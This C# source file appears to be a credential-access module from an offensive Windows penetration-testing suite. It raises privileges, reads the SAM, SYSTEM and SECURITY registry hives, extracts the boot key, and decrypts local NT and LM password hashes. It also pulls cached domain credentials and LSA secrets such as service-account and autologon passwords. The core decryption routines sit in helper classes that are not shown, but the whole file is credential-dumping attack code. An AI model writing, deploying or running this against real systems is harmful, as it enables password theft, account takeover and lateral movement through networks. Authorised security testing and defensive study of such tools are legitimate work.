using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Management;
using System.Security.Cryptography;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using Microsoft.Extensions.Logging;

namespace EliteWindowsPentestSuite.Modules.CredentialAccess
{
    public class SAMExtraction
    {
        private readonly ILogger _logger;
        private readonly PrivilegeManager _privilegeManager;
        private readonly RegistryHiveManager _hiveManager;
        private readonly CryptographyEngine _cryptoEngine;

        private static readonly string[] HIVE_PATHS = {
            @"C:\Windows\System32\config\SAM",
            @"C:\Windows\System32\config\SYSTEM",
            @"C:\Windows\System32\config\SECURITY"
        };

        private static readonly string[] BOOT_KEY_PARTS = { "JD", "Skew1", "GBG", "Data" };

        public SAMExtraction(ILogger logger, PrivilegeManager privilegeManager,
            RegistryHiveManager hiveManager, CryptographyEngine cryptoEngine)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _privilegeManager = privilegeManager ?? throw new ArgumentNullException(nameof(privilegeManager));
            _hiveManager = hiveManager ?? throw new ArgumentNullException(nameof(hiveManager));
            _cryptoEngine = cryptoEngine ?? throw new ArgumentNullException(nameof(cryptoEngine));
        }

        public async Task<SAMExtractionResult> ExecuteAsync()
        {
            var result = new SAMExtractionResult
            {
                StartTime = DateTime.UtcNow,
                ExecutionId = Guid.NewGuid().ToString()
            };

            try
            {
                _logger.LogInformation($"Initiating SAM extraction {result.ExecutionId}");

                await ValidatePrerequisitesAsync(result);
                if (!result.CanProceed) return result;

                await EstablishHiveAccessAsync(result);
                if (!result.HasRequiredAccess) return result;

                await ExtractBootKeyAsync(result);
                if (!result.BootKeyExtracted) return result;

                await ProcessSAMAccountsAsync(result);
                await ProcessCachedCredentialsAsync(result);
                await ProcessLSASecretsAsync(result);
                await ProcessDomainControllerDataAsync(result);

                result.IsSuccessful = DetermineOverallSuccess(result);
                result.CompletionTime = DateTime.UtcNow;
                result.Duration = result.CompletionTime - result.StartTime;

                _logger.LogInformation($"SAM extraction {result.ExecutionId} completed: {result.IsSuccessful}");
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
                result.Exception = ex;
                _logger.LogError(ex, $"SAM extraction {result.ExecutionId} failed");
            }

            return result;
        }

        private async Task ValidatePrerequisitesAsync(SAMExtractionResult result)
        {
            result.IsElevated = _privilegeManager.IsProcessElevated();
            result.HasSeBackupPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeBackupPrivilege");
            result.HasSeRestorePrivilege = await _privilegeManager.EnablePrivilegeAsync("SeRestorePrivilege");
            result.HasSeSecurityPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeSecurityPrivilege");
            result.HasSeTcbPrivilege = await _privilegeManager.EnablePrivilegeAsync("SeTcbPrivilege");

            result.SystemArchitecture = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            result.WindowsVersion = Environment.OSVersion.VersionString;
            result.ProcessArchitecture = Environment.Is64BitProcess ? "x64" : "x86";

            result.CanProceed = result.IsElevated &&
                               (result.HasSeBackupPrivilege || result.HasSeRestorePrivilege);

            if (!result.CanProceed)
            {
                result.ErrorMessage = "Insufficient privileges for SAM extraction";
            }
        }

        private async Task EstablishHiveAccessAsync(SAMExtractionResult result)
        {
            var accessTasks = new[]
            {
                TestHiveAccessAsync("SAM", result),
                TestHiveAccessAsync("SYSTEM", result),
                TestHiveAccessAsync("SECURITY", result)
            };

            await Task.WhenAll(accessTasks);

            result.HasRequiredAccess = result.SamHiveAccessible && result.SystemHiveAccessible;

            if (!result.HasRequiredAccess)
            {
                await AttemptFileBasedAccessAsync(result);
            }
        }

        private async Task TestHiveAccessAsync(string hiveName, SAMExtractionResult result)
        {
            try
            {
                var accessible = await _hiveManager.TestHiveAccessAsync(hiveName);

                switch (hiveName.ToUpper())
                {
                    case "SAM":
                        result.SamHiveAccessible = accessible;
                        break;
                    case "SYSTEM":
                        result.SystemHiveAccessible = accessible;
                        break;
                    case "SECURITY":
                        result.SecurityHiveAccessible = accessible;
                        break;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error testing {hiveName} hive access");
            }
        }

        private async Task AttemptFileBasedAccessAsync(SAMExtractionResult result)
        {
            var fileTasks = HIVE_PATHS.Select(async path =>
            {
                try
                {
                    var accessible = await _hiveManager.TestFileAccessAsync(path);
                    var fileName = Path.GetFileName(path);

                    switch (fileName.ToUpper())
                    {
                        case "SAM":
                            result.SamFileAccessible = accessible;
                            break;
                        case "SYSTEM":
                            result.SystemFileAccessible = accessible;
                            break;
                        case "SECURITY":
                            result.SecurityFileAccessible = accessible;
                            break;
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"Error testing file access: {path}");
                }
            });

            await Task.WhenAll(fileTasks);

            result.HasRequiredAccess = result.HasRequiredAccess ||
                                      (result.SamFileAccessible && result.SystemFileAccessible);
        }

        private async Task ExtractBootKeyAsync(SAMExtractionResult result)
        {
            try
            {
                var bootKeyBytes = await _hiveManager.ExtractBootKeyAsync(BOOT_KEY_PARTS);

                if (bootKeyBytes != null && bootKeyBytes.Length >= 16)
                {
                    result.BootKey = Convert.ToHexString(bootKeyBytes);
                    result.BootKeyExtracted = true;
                    result.BootKeyLength = bootKeyBytes.Length;
                }
                else
                {
                    result.ErrorMessage = "Failed to extract valid boot key";
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = $"Boot key extraction failed: {ex.Message}";
                _logger.LogError(ex, "Boot key extraction error");
            }
        }

        private async Task ProcessSAMAccountsAsync(SAMExtractionResult result)
        {
            try
            {
                var accounts = await _hiveManager.EnumerateUserAccountsAsync();
                result.TotalAccountsFound = accounts.Count;

                var processingTasks = accounts.Select(async account =>
                {
                    try
                    {
                        var hashEntry = await ProcessUserAccountAsync(account, result.BootKey);
                        if (hashEntry != null)
                        {
                            result.ExtractedHashes.Add(hashEntry);
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error processing account: {account.RID}");
                        result.ProcessingErrors.Add($"Account {account.RID}: {ex.Message}");
                    }
                });

                await Task.WhenAll(processingTasks);
                result.HashesExtracted = result.ExtractedHashes.Count > 0;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "SAM accounts processing failed");
                result.ProcessingErrors.Add($"SAM processing: {ex.Message}");
            }
        }

        private async Task<SAMHashEntry> ProcessUserAccountAsync(UserAccountInfo account, string bootKey)
        {
            var vData = await _hiveManager.GetAccountVDataAsync(account.RID);
            var fData = await _hiveManager.GetAccountFDataAsync(account.RID);

            if (vData == null || fData == null) return null;

            var hashEntry = new SAMHashEntry
            {
                RID = account.RID,
                Username = _cryptoEngine.ExtractUsernameFromVData(vData),
                AccountType = DetermineAccountType(account.RID),
                IsEnabled = _cryptoEngine.IsAccountEnabled(fData),
                LastLogin = _cryptoEngine.ExtractLastLoginTime(fData),
                PasswordLastSet = _cryptoEngine.ExtractPasswordLastSetTime(fData),
                LoginCount = _cryptoEngine.ExtractLoginCount(fData),
                BadPasswordCount = _cryptoEngine.ExtractBadPasswordCount(fData)
            };

            var bootKeyBytes = Convert.FromHexString(bootKey);
            hashEntry.NTHash = await _cryptoEngine.DecryptNTHashAsync(fData, bootKeyBytes, account.RID);
            hashEntry.LMHash = await _cryptoEngine.DecryptLMHashAsync(fData, bootKeyBytes, account.RID);

            hashEntry.HasNTHash = !string.IsNullOrEmpty(hashEntry.NTHash);
            hashEntry.HasLMHash = !string.IsNullOrEmpty(hashEntry.LMHash);

            return hashEntry;
        }

        private async Task ProcessCachedCredentialsAsync(SAMExtractionResult result)
        {
            if (!result.SecurityHiveAccessible && !result.SecurityFileAccessible) return;

            try
            {
                var cachedCreds = await _hiveManager.ExtractCachedCredentialsAsync();

                foreach (var cred in cachedCreds)
                {
                    var entry = new CachedCredentialEntry
                    {
                        Username = cred.Username,
                        Domain = cred.Domain,
                        Hash = cred.Hash,
                        HashType = cred.HashType,
                        LastAccess = cred.LastAccess,
                        IterationCount = cred.IterationCount
                    };

                    result.CachedCredentials.Add(entry);
                }

                result.CachedCredentialsExtracted = result.CachedCredentials.Count > 0;
                result.CachedCredentialsCount = result.CachedCredentials.Count;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Cached credentials processing failed");
                result.ProcessingErrors.Add($"Cached credentials: {ex.Message}");
            }
        }

        private async Task ProcessLSASecretsAsync(SAMExtractionResult result)
        {
            if (!result.SecurityHiveAccessible && !result.SecurityFileAccessible) return;

            try
            {
                var lsaSecrets = await _hiveManager.ExtractLSASecretsAsync();

                foreach (var secret in lsaSecrets)
                {
                    var entry = new LSASecretEntry
                    {
                        SecretName = secret.Name,
                        SecretType = ClassifySecretType(secret.Name),
                        SecretValue = secret.Value,
                        IsEncrypted = secret.IsEncrypted,
                        LastModified = secret.LastModified,
                        DataLength = secret.Value?.Length ?? 0
                    };

                    result.LSASecrets.Add(entry);
                }

                result.LSASecretsExtracted = result.LSASecrets.Count > 0;
                result.LSASecretsCount = result.LSASecrets.Count;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "LSA secrets processing failed");
                result.ProcessingErrors.Add($"LSA secrets: {ex.Message}");
            }
        }

        private async Task ProcessDomainControllerDataAsync(SAMExtractionResult result)
        {
            try
            {
                result.IsDomainController = await _hiveManager.IsDomainControllerAsync();

                if (result.IsDomainController)
                {
                    result.DomainSID = await _hiveManager.GetDomainSIDAsync();
                    result.DomainName = await _hiveManager.GetDomainNameAsync();
                    result.ForestFunctionality = await _hiveManager.GetForestFunctionalityAsync();
                    result.DomainFunctionality = await _hiveManager.GetDomainFunctionalityAsync();
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Domain controller data processing failed");
                result.ProcessingErrors.Add($"Domain controller data: {ex.Message}");
            }
        }

        private bool DetermineOverallSuccess(SAMExtractionResult result)
        {
            return result.BootKeyExtracted &&
                   (result.HashesExtracted ||
                    result.CachedCredentialsExtracted ||
                    result.LSASecretsExtracted) &&
                   result.ProcessingErrors.Count == 0;
        }

        private string DetermineAccountType(string rid)
        {
            return rid switch
            {
                "000001F4" => "Administrator",
                "000001F5" => "Guest",
                "000001F6" => "DefaultAccount",
                "000001F7" => "WDAGUtilityAccount",
                _ when int.TryParse(rid, System.Globalization.NumberStyles.HexNumber, null, out int ridValue) =>
                    ridValue >= 1000 ? "StandardUser" : "SystemAccount",
                _ => "Unknown"
            };
        }

        private string ClassifySecretType(string secretName)
        {
            return secretName.ToUpper() switch
            {
                var name when name.StartsWith("_SC_") => "ServiceAccount",
                var name when name.StartsWith("DPAPI_") => "DPAPI",
                var name when name.StartsWith("$MACHINE.") => "MachineAccount",
                "DefaultPassword" => "AutoLogon",
                "NL$KM" => "KerberosKey",
                "SECURITY" => "SecuritySubsystem",
                _ => "Unknown"
            };
        }
    }

    public class SAMExtractionResult : BaseResult
    {
        public string ExecutionId { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime CompletionTime { get; set; }
        public TimeSpan Duration { get; set; }

        public bool IsElevated { get; set; }
        public bool HasSeBackupPrivilege { get; set; }
        public bool HasSeRestorePrivilege { get; set; }
        public bool HasSeSecurityPrivilege { get; set; }
        public bool HasSeTcbPrivilege { get; set; }

        public string SystemArchitecture { get; set; }
        public string ProcessArchitecture { get; set; }
        public string WindowsVersion { get; set; }

        public bool CanProceed { get; set; }
        public bool HasRequiredAccess { get; set; }

        public bool SamHiveAccessible { get; set; }
        public bool SystemHiveAccessible { get; set; }
        public bool SecurityHiveAccessible { get; set; }
        public bool SamFileAccessible { get; set; }
        public bool SystemFileAccessible { get; set; }
        public bool SecurityFileAccessible { get; set; }

        public bool BootKeyExtracted { get; set; }
        public string BootKey { get; set; }
        public int BootKeyLength { get; set; }

        public int TotalAccountsFound { get; set; }
        public bool HashesExtracted { get; set; }
        public List<SAMHashEntry> ExtractedHashes { get; set; } = new List<SAMHashEntry>();

        public bool CachedCredentialsExtracted { get; set; }
        public int CachedCredentialsCount { get; set; }
        public List<CachedCredentialEntry> CachedCredentials { get; set; } = new List<CachedCredentialEntry>();

        public bool LSASecretsExtracted { get; set; }
        public int LSASecretsCount { get; set; }
        public List<LSASecretEntry> LSASecrets { get; set; } = new List<LSASecretEntry>();

        public bool IsDomainController { get; set; }
        public string DomainSID { get; set; }
        public string DomainName { get; set; }
        public string ForestFunctionality { get; set; }
        public string DomainFunctionality { get; set; }

        public List<string> ProcessingErrors { get; set; } = new List<string>();
        public Exception Exception { get; set; }
    }

    public class SAMHashEntry
    {
        public string RID { get; set; }
        public string Username { get; set; }
        public string AccountType { get; set; }
        public bool IsEnabled { get; set; }
        public string NTHash { get; set; }
        public string LMHash { get; set; }
        public bool HasNTHash { get; set; }
        public bool HasLMHash { get; set; }
        public DateTime LastLogin { get; set; }
        public DateTime PasswordLastSet { get; set; }
        public int LoginCount { get; set; }
        public int BadPasswordCount { get; set; }
    }

    public class CachedCredentialEntry
    {
        public string Username { get; set; }
        public string Domain { get; set; }
        public string Hash { get; set; }
        public string HashType { get; set; }
        public DateTime LastAccess { get; set; }
        public int IterationCount { get; set; }
    }

    public class LSASecretEntry
    {
        public string SecretName { get; set; }
        public string SecretType { get; set; }
        public string SecretValue { get; set; }
        public bool IsEncrypted { get; set; }
        public DateTime LastModified { get; set; }
        public int DataLength { get; set; }
    }

    public class UserAccountInfo
    {
        public string RID { get; set; }
        public string Name { get; set; }
    }
}